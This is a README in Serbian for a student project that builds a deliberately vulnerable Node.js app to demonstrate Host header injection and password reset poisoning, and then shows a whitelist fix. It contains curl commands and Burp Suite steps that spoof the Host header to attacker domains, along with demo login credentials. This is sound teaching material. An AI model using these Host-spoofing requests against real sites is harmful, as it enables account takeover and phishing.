# Host Header Injection – BVS Projekat

| Član | Zaduženje |
|------|-----------|
| Marko Andrić | Backend aplikacija, login/register, password reset, scaffold |
| Ana Nikolić | Exploit demonstracija, Burp Suite, dokumentacija, secure-version grana |

## Funkcionalnosti (ranjiva verzija)

- registracija i prijava (sesije, bcrypt)
- password reset – link iz `req.headers.host` (password reset poisoning)
- admin panel – tokeni i simulirani email-ovi
- open redirect i API za apsolutne URL-ove

## Pokretanje

```bash
cd vulnerable-app
npm install
npm start
```

http://localhost:3000

| Email | Lozinka | Uloga |
|-------|---------|-------|
| admin@bank.local | admin123 | admin |
| marko@example.com | user123 | user |

## Demonstracija napada

### Password Reset Poisoning

```bash
# Normalni zahtev
curl -X POST http://localhost:3000/forgot-password \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=marko@example.com"

# NAPAD – lažni Host header
curl -X POST http://localhost:3000/forgot-password \
  -H "Host: evil-attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=marko@example.com"
```

Dokaz: http://localhost:3000/admin → kolona `host_used`

### Open Redirect

```bash
curl -v -H "Host: phishing-bank.com" \
  "http://localhost:3000/redirect?path=/dashboard"
```

### Automatski demo svih napada

```bash
bash scripts/run-all-exploits.sh
```

## Burp Suite demonstracija

1. Pokrenuti Burp Suite → Proxy → `127.0.0.1:8080`
2. Otvoriti http://localhost:3000/forgot-password
3. Uneti `marko@example.com` i kliknuti Submit
4. U **Proxy → HTTP history** pronaći `POST /forgot-password`
5. Desni klik → **Send to Repeater**
6. Izmeniti: `Host: evil-attacker.com`
7. Kliknuti **Send**
8. Proveriti admin panel – `host_used = evil-attacker.com`

## Zaštita (secure-version grana)

```js
// SIGURNO: hardkodovani BASE_URL, ne req.headers.host
const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

function validateHost(req, res, next) {
  if (!ALLOWED_HOSTS.includes(req.headers.host)) {
    return res.status(400).render('error', { message: 'Host nije dozvoljen.' });
  }
  next();
}
```

```bash
# Napad ne prolazi na secure-version grani
curl -X POST http://localhost:3000/forgot-password \
  -H "Host: evil.com" \
  -d "email=marko@example.com"
# Rezultat: 400 Bad Request
```

## Git grane

| Grana | Autor | Opis |
|-------|-------|------|
| `feat/01-scaffold` | Marko Andrić | Express + SQLite osnova |
| `feat/02-auth` | Marko Andrić | Login, register, sesije |
| `feat/03-host-injection` | Marko Andrić | Ranjivi password reset, admin, redirect |
| `feat/04-exploit-demo` | Ana Nikolić | Exploit skripte, Burp Suite docs, README |
| `secure-version` | Ana Nikolić | Whitelist validacija, hardkodovani BASE_URL |

## Reference

- [OWASP – Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- [PortSwigger – Host header attacks](https://portswigger.net/web-security/host-header)
- [PortSwigger – Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)